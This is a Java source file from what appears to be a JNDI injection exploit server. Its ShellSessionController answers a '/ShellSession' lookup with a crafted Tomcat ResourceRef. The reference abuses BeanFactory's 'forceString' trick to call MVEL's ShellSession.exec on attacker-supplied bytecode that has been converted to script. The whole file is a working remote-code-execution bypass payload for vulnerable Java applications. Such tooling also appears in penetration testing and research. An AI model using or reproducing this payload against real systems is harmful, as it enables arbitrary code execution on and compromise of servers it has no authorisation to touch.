package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;
import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;
import static com.h2tg.ysogate.bullet.defineClass.MvelConverter.mvel2js;

@JNDIController
@JNDIMapping("/ShellSession")
public class ShellSessionController extends BasicController
{
    @Override
    public Object process(Object obj) {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + ShellSession");
        String code = all(Base64.getEncoder().encodeToString(byteCode));

        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=exec"));
        ref.add(new StringRefAddr("x", mvel2js(code)));
        return ref;
    }
}
